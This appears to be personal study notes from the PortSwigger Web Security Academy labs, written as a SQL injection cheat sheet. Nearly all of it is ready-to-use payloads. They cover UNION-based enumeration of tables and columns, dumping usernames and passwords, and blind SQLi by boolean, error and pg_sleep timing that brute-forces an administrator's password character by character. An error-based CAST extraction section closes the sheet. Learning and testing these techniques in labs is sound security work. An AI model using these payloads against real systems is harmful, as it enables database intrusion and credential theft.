# How to detect SQL injection vulnerabilities
- The single quote character `'` and look for errors or other anomalies. 
- SQL-specific syntax error
- Boolean conditions such as `OR 1=1` and `OR 1=2`, and look for differences in the application's responses.
- Time delays
- OAST
***  
FYI : [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

## SQL injection examples
- [Retrieving hidden data](#RetrievingHiddenData)
- [Subverting application logic](#SubvertingApplicationLogic)
- [UNION attacks](#UNIONAttacks)
- [Blind SQL Injection](#BlinSQLi)

<a id="RetrievingHiddenData"></a>
### Retrieving hidden data  
	
	'+OR+1=1--


<a id="SubvertingApplicationLogic"></a>
### Subverting application logic
- Login bypass

<a id="UNIONAttacks"></a>
### UNION attacks
1. Find the number of columns  
`' order by 2 --` -> 200  
`' order by 3 --` -> Error  

    >The number of columns is 2

2. Find the data type of the columns  

    >Stiring data or Numeric data  
    >`''` is string data  

	```
	' UNION SELECT 'a', NULL--
	' UNION SELECT NULL, 'a'--
	```
 
    >Use `#` instead of `--`
      
    `' UNION SELECT 'a','b'#`  (Microsoft,MySQL)  

    `' UNION SELECT NULL, 'a' FROM DUAL--` (Oracle)  

4. Version of the database  

    `' UNION SELECT @@version, NULL--`  (Microsoft,MySQL)  
    `' UNION SELECT version(), NULL--`  (PostgreSQL)  
    `' UNION SELECT banner, NULL FROM v$version--`  (Oracle)  
    `' UNION SELECT version, NULL FROM v$instance--`  (Oracle)  


5. Output the list of table names in the database  

    `' UNION SELECT table_name, NULL FROM information_schema.tables--`  (PostgreSQL)  
    `' UNION SELECT table_name, NULL FROM all_tables--`  (Oracle)  


6. Output the column names of the table  

    `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name ='tablename'--`  (PostgreSQL)  
    `' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name ='tablename'--`  (Oracle)  


7. Output the username and passwords  

    `' UNION SELECT username, passwords FROM tablename--`





- Retrieving multiple values within a single column  

   >In some cases the query in the previous example may only return a single column.  
  Retrieve multiple values together within this single column by concatenating the values together.

      ```
      ' UNION SELECT NULL,'abc'--
      ' UNION SELECT NULL,username||'~'||password FROM users--
      ```
<a id="BlinSQLi"></a>
### Blind SQL Injection
- **Conditional Responses**
1. Confirm that the parameter is vulunerable to blind SQLi  
	```
	' and 1=1--'    ->True
	' and 1=0--'    ->False  
	```
	
2. Confirm that we want to get table  
	```
	' and (SELECT 'x' FROM YOUR-TABLE-NAME LIMIT 1)='x'--'
	```
	  
3. Confirm that username YOUR-USERNAME exists users table  
	```
	' and (SELECT username FROM YOUR-TABLE-NAME WHERE username='x')='x'--'
	```
	
4. Enumerate the password of you get YOUR-USERNAME user  
	```
	' and (SELECT username FROM YOUR-TABLE-NAME WHERE username='x' and LENGTH(password)>$1$)='x'--'
	```  
	　To bruteforce password length with BurpIntruder.
	
	```
	' and (SELECT substring(password,$1$,1) FROM YOUR-TABLE-NAME WHERE username='x')='$a$'--'
	```
	>Bruteforce the string from the first character to the end you want to confirm
	    
- **Conditional Errors**　　
 1. Prove that parameter is vulnerable  
	```
	' || (select '' from dual) || '
 
 	-> oracle database
	```
 
 2. Confirm that the users table exists in the database  
	```
	' || (select '' from users where rownum =1) || '
 
	-> users table exists
	```

 3. Confirm that the administrator user exists in the users table　　
	```
	' || (select '' from users where username='administrator') || ' 
	
	' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || ' 
	
	' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || '
 
	-> Internal server error -> administrator user exists

 
	' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='fwefwoeijfewow') || '
 
	-> 200 response
 	-> user does not exist in database
	```

 4. Determine length of password  
	```
	' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>19) || ' 

 	-> 200 response at 50 -> length of password is less than 50
	-> 20 characters
	```
 
 5. Output the administrator password  
	```
	' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,1,1)='a') || ' 

 	-> w is not the first character of the password
	```

- **Time delays**　　
	```
	'|| (SELECT pg_sleep(10))--
	```
 
- **Ttime delays and information retrival**
1. Confirm that the parameter is vulnerable to SQLi  
	```
	' || pg_sleep(10)--
	```
2. Confirm that the users table exists in the database  
	```
	' || (select case when (1=0) then pg_sleep(10) else pg_sleep(-1) end)--
	
	' || (select case when (1=1) then pg_sleep(10) else pg_sleep(-1) end from users WHERE username='administrator')--
	```

3. Enumerate the password length  
	```
	' || (select case when (1=1) then pg_sleep(10) else pg_sleep(-1) end from users WHERE username='administrator' and LENGTH(password)>20)--
	
	-> length of password is 20 characters
	```
4. Enumerate the administrator password  
	```
	' || (select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(10) else pg_sleep(-1) end from users)--
	```
 #### Other SQLi
-  Filter bypass via XML encoding  
obfuscation with Hackvertor extension

-  Visible error-based SQL injection  
	Example)  

		select trackingId from trackingIdTable where trackingId='pFNjoVuG3fnTFJ3a''  
		SELECT * FROM tracking WHERE id = 'pFNjoVuG3fnTFJ3a'--'. Expected  char  

	use CAST()

	```
	' AND CAST((SELECT 1) as int)--
	
	' AND 1=CAST((SELECT username from users LIMIT 1) as int)--
	
	' AND 1=CAST((SELECT password from users LIMIT 1) as int)--
	```











